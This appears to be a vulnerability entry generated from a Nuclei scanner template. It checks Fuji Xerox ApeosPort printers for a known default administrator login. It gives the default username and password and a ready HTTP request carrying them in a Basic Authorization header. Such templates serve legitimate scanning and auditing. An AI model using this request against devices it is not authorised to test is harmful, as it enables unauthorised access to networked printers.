# Vulnerability: Fuji Xerox ApeosPort - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`fuji-xerox-default-login.yaml`)

## Description
This template checks for the default credentials (username: 11111, password: x-admin) on Fuji Xerox ApeosPort series printers. If the credentials are valid, the response will have a 200 HTTP status code. Tested on a Fuji Xerox ApeosPort-V C2275 T2.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /prop.htm HTTP/1.1
Host: {{Hostname}}
Authorization: Basic MTExMTE6eC1hZG1pbg==
Connection: close
```

